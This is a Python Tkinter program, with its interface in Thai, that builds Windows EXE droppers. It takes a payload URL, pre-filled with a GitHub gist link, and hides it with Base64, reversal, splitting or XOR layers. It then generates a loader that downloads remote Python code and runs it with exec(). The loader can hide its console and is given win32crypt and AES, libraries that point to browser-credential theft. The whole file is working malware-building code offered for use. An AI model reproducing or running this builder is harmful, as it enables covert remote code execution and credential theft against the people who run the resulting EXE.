import os
import sys
import base64
import subprocess
import shutil
import tempfile
import re
import urllib.request
import ast
import threading
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import hashlib
import random
import string

class ExeBuilderGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("EXE Builder - สร้างโปรแกรมจากลิงก์อัตโนมัติ")
        self.root.geometry("750x700")
        self.root.resizable(False, False)
        
        # สีและสไตล์
        self.root.configure(bg='#2b2b2b')
        
        # หัวข้อ
        title = tk.Label(root, text="🔧 EXE Builder", font=("Arial", 20, "bold"), 
                         bg='#2b2b2b', fg='#4CAF50')
        title.pack(pady=15)
        
        subtitle = tk.Label(root, text="สร้างโปรแกรม EXE จากลิงก์ Python อัตโนมัติ", 
                            font=("Arial", 10), bg='#2b2b2b', fg='#cccccc')
        subtitle.pack()
        
        # Frame หลัก
        main_frame = tk.Frame(root, bg='#2b2b2b')
        main_frame.pack(padx=20, pady=15, fill='both', expand=True)
        
        # 1. ลิงก์ URL
        tk.Label(main_frame, text="📎 ลิงก์ไฟล์ Python (payload):", 
                 font=("Arial", 10, "bold"), bg='#2b2b2b', fg='white').pack(anchor='w', pady=(0,5))
        self.url_entry = tk.Entry(main_frame, width=80, font=("Arial", 10), bg='#3c3c3c', fg='white', insertbackground='white')
        self.url_entry.pack(fill='x', pady=(0,10))
        self.url_entry.insert(0, "https://gist.githubusercontent.com/chanakanyeunsuk-ai/a453dad036c8668d50acb74b6dade15e/raw/dfe4c5d67042ca92361493d03823fd1873e27e9d/bigtoth.py")
        
        # 2. ชื่อไฟล์
        name_frame = tk.Frame(main_frame, bg='#2b2b2b')
        name_frame.pack(fill='x', pady=(0,10))
        tk.Label(name_frame, text="📄 ชื่อไฟล์ exe:", font=("Arial", 10, "bold"), 
                 bg='#2b2b2b', fg='white').pack(side=tk.LEFT, padx=(0,10))
        self.name_entry = tk.Entry(name_frame, width=30, font=("Arial", 10), bg='#3c3c3c', fg='white')
        self.name_entry.pack(side=tk.LEFT)
        self.name_entry.insert(0, "my_program")
        
        # 3. โหมดการทำงาน
        mode_frame = tk.Frame(main_frame, bg='#2b2b2b')
        mode_frame.pack(fill='x', pady=(0,10))
        tk.Label(mode_frame, text="🎮 โหมด:", font=("Arial", 10, "bold"), 
                 bg='#2b2b2b', fg='white').pack(side=tk.LEFT, padx=(0,10))
        self.console_var = tk.BooleanVar(value=True)
        tk.Radiobutton(mode_frame, text="มี Console (แสดงผล)", variable=self.console_var, 
                       value=True, bg='#2b2b2b', fg='white', selectcolor='#2b2b2b').pack(side=tk.LEFT, padx=5)
        tk.Radiobutton(mode_frame, text="ไม่มี Console (ซ่อน)", variable=self.console_var, 
                       value=False, bg='#2b2b2b', fg='white', selectcolor='#2b2b2b').pack(side=tk.LEFT, padx=5)
        
        # 4. ไอคอน
        icon_frame = tk.Frame(main_frame, bg='#2b2b2b')
        icon_frame.pack(fill='x', pady=(0,10))
        tk.Label(icon_frame, text="🖼️ ไอคอน (.ico):", font=("Arial", 10, "bold"), 
                 bg='#2b2b2b', fg='white').pack(side=tk.LEFT, padx=(0,10))
        self.icon_path = tk.StringVar()
        tk.Entry(icon_frame, textvariable=self.icon_path, width=40, bg='#3c3c3c', fg='white').pack(side=tk.LEFT, padx=5)
        tk.Button(icon_frame, text="เลือกไฟล์", command=self.select_icon, 
                  bg='#FF9800', fg='white').pack(side=tk.LEFT, padx=5)
        
        # 5. ระดับการป้องกัน
        protect_frame = tk.Frame(main_frame, bg='#2b2b2b')
        protect_frame.pack(fill='x', pady=(0,10))
        tk.Label(protect_frame, text="🛡️ ระดับป้องกัน:", font=("Arial", 10, "bold"), 
                 bg='#2b2b2b', fg='white').pack(side=tk.LEFT, padx=(0,10))
        self.protect_level = tk.StringVar(value="medium")
        tk.Radiobutton(protect_frame, text="ปกติ (Base64)", variable=self.protect_level, 
                       value="low", bg='#2b2b2b', fg='white', selectcolor='#2b2b2b').pack(side=tk.LEFT, padx=5)
        tk.Radiobutton(protect_frame, text="ปานกลาง (หลายชั้น)", variable=self.protect_level, 
                       value="medium", bg='#2b2b2b', fg='white', selectcolor='#2b2b2b').pack(side=tk.LEFT, padx=5)
        tk.Radiobutton(protect_frame, text="สูง (เข้ารหัส + XOR)", variable=self.protect_level, 
                       value="high", bg='#2b2b2b', fg='white', selectcolor='#2b2b2b').pack(side=tk.LEFT, padx=5)
        
        # 6. ปุ่มสร้าง
        self.build_btn = tk.Button(main_frame, text="⚡ สร้าง EXE", command=self.build_exe,
                                    bg='#4CAF50', fg='white', font=("Arial", 14, "bold"), 
                                    padx=20, pady=10)
        self.build_btn.pack(pady=15)
        
        # 7. สถานะการทำงาน
        tk.Label(main_frame, text="📝 สถานะ:", font=("Arial", 10, "bold"), 
                 bg='#2b2b2b', fg='white').pack(anchor='w', pady=(0,5))
        self.status_text = scrolledtext.ScrolledText(main_frame, height=10, width=80, 
                                                       bg='black', fg='#00ff00', font=("Consolas", 9))
        self.status_text.pack(fill='both', expand=True)
    
    def select_icon(self):
        file_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
        if file_path:
            self.icon_path.set(file_path)
            self.log(f"[+] เลือกไอคอน: {file_path}")
    
    def log(self, message):
        self.status_text.insert(tk.END, message + "\n")
        self.status_text.see(tk.END)
        self.root.update()
    
    def obfuscate_url(self, url, level):
        """เข้ารหัสลิงก์ตามระดับการป้องกัน"""
        if level == "low":
            # แค่ Base64
            return f"base64.b64decode('{base64.b64encode(url.encode()).decode()}').decode()"
        
        elif level == "medium":
            # Base64 + Reverse + Split
            reversed_url = url[::-1]
            b64_encoded = base64.b64encode(reversed_url.encode()).decode()
            # แบ่งเป็นชิ้นๆ
            chunk_size = len(b64_encoded) // 3
            parts = [b64_encoded[i:i+chunk_size] for i in range(0, len(b64_encoded), chunk_size)]
            
            obf_code = f"""
# หลายชั้น
_part1 = '{parts[0]}'
_part2 = '{parts[1]}' if len(parts) > 1 else ''
_part3 = '{parts[2]}' if len(parts) > 2 else ''
_combined = _part1 + _part2 + _part3
_reversed = base64.b64decode(_combined).decode()
_url = _reversed[::-1]
"""
            return obf_code, "_url"
        
        elif level == "high":
            # XOR + Base64 + Obfuscation
            key = random.randint(1, 255)
            xored = ''.join(chr(ord(c) ^ key) for c in url)
            b64_encoded = base64.b64encode(xored.encode()).decode()
            
            # สร้างฟังก์ชันถอดรหัสแบบซับซ้อน
            obf_code = f"""
def _decode_url():
    _k = {key}
    _b64 = '{b64_encoded}'
    _xored = base64.b64decode(_b64).decode()
    _url = ''.join(chr(ord(c) ^ _k) for c in _xored)
    return _url

_url = _decode_url()
"""
            return obf_code, "_url"
        
        return f"'{url}'", "url"
    
    def build_exe(self):
        url = self.url_entry.get().strip()
        exe_name = self.name_entry.get().strip()
        console_mode = self.console_var.get()
        icon_path = self.icon_path.get()
        protect_level = self.protect_level.get()
        
        if not url:
            messagebox.showwarning("เตือน", "กรุณาใส่ลิงก์")
            return
        
        if not exe_name:
            exe_name = "output"
        
        self.build_btn.config(state=tk.DISABLED, text="⏳ กำลังสร้าง...")
        self.log("\n" + "=" * 50)
        self.log(f"[+] เริ่มสร้าง EXE (ระดับป้องกัน: {protect_level})...")
        
        def build():
            try:
                # สร้างโค้ด obfuscated URL
                if protect_level == "low":
                    url_code = f"url = base64.b64decode('{base64.b64encode(url.encode()).decode()}').decode()"
                    url_var = "url"
                else:
                    url_code, url_var = self.obfuscate_url(url, protect_level)
                
                # สร้างเทมเพลต loader
                template = f'''import os, sys, base64, urllib.request, subprocess, time, threading, winreg, json, re, datetime

if os.name != "nt": 
    sys.exit()

stop = False

def anim():
    dots = ['.', '..', '...', '....', '.....', '......']
    idx = 0
    while not stop:
        sys.stdout.write(f'\\rConnecting{{dots[idx % len(dots)]}}')
        sys.stdout.flush()
        idx += 1
        time.sleep(0.5)

# URL ที่ถูกป้องกัน
{url_code}

# Registry fallback
try:
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\\\MyApp")
    {url_var} = winreg.QueryValueEx(key, "URL")[0]
except:
    pass

# Animation
t = threading.Thread(target=anim)
t.daemon = True
t.start()
time.sleep(3)
stop = True
t.join()
print('\\rConnected!   ')
print("Loading payload...")

try:
    req = urllib.request.Request({url_var}, headers={{"User-Agent": "Mozilla/5.0"}})
    response = urllib.request.urlopen(req, timeout=15)
    code = response.read().decode('utf-8')
    
    # สร้าง namespace
    namespace = {{
        '__name__': '__main__',
        '__builtins__': __builtins__,
        'os': os, 'sys': sys, 'time': time, 'threading': threading,
        'subprocess': subprocess, 'base64': base64, 'json': json,
        're': re, 'datetime': datetime, 'urllib': urllib,
        'winreg': winreg,
    }}
    
    # พยายาม import modules เพิ่ม
    try:
        import win32crypt
        namespace['win32crypt'] = win32crypt
    except:
        pass
    
    try:
        from Crypto.Cipher import AES
        namespace['Crypto'] = __import__('Crypto')
    except:
        pass
    
    # รัน payload
    exec(code, namespace)
    
except Exception as e:
    print(f"Error: {{e}}")
    import traceback
    traceback.print_exc()
    time.sleep(5)

print("Done!")
time.sleep(2)
'''
                
                # สร้างไฟล์ชั่วคราว
                build_dir = tempfile.mkdtemp()
                script_path = os.path.join(build_dir, "loader.py")
                
                with open(script_path, "w", encoding="utf-8") as f:
                    f.write(template)
                
                # สร้างคำสั่ง PyInstaller
                cmd = [sys.executable, "-m", "PyInstaller", "--onefile"]
                
                if not console_mode:
                    cmd.append("--noconsole")
                
                # hidden imports
                hidden_modules = ['win32crypt', 'Crypto', 'Crypto.Cipher', 'json', 're', 'datetime']
                for module in hidden_modules:
                    cmd.append(f"--hidden-import={module}")
                    self.log(f"[+] Bundle: {module}")
                
                if icon_path and os.path.exists(icon_path):
                    cmd.append(f"--icon={icon_path}")
                
                # Options
                cmd.append("--clean")
                cmd.append("--noconfirm")
                cmd.append(f"--name={exe_name}")
                cmd.append(f"--distpath={os.getcwd()}")
                cmd.append(f"--workpath={os.path.join(build_dir, 'build')}")
                cmd.append(f"--specpath={build_dir}")
                cmd.append(script_path)
                
                self.log("[+] กำลังสร้าง exe (ใช้เวลา 1-2 นาที)...")
                
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                if result.returncode == 0:
                    self.log(f"\n[✓] สร้างสำเร็จ!")
                    exe_path = os.path.join(os.getcwd(), exe_name + '.exe')
                    self.log(f"[✓] ไฟล์: {exe_path}")
                    messagebox.showinfo("สำเร็จ", f"สร้าง {exe_name}.exe เรียบร้อย!")
                else:
                    self.log(f"\n[✗] สร้างไม่สำเร็จ")
                    if result.stderr:
                        self.log(f"Error: {result.stderr[:500]}")
                    messagebox.showerror("Error", "สร้าง exe ไม่สำเร็จ")
                
                shutil.rmtree(build_dir, ignore_errors=True)
                
                spec_file = os.path.join(os.getcwd(), exe_name + '.spec')
                if os.path.exists(spec_file):
                    os.remove(spec_file)
                
            except Exception as e:
                self.log(f"[✗] เกิดข้อผิดพลาด: {e}")
                messagebox.showerror("Error", str(e))
            finally:
                self.build_btn.config(state=tk.NORMAL, text="⚡ สร้าง EXE")
        
        threading.Thread(target=build, daemon=True).start()

if __name__ == "__main__":
    # ติดตั้ง dependencies
    try:
        import PyInstaller
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
    
    try:
        import win32crypt
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pypiwin32"])
    
    try:
        from Crypto.Cipher import AES
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
    
    root = tk.Tk()
    app = ExeBuilderGUI(root)
    root.mainloop()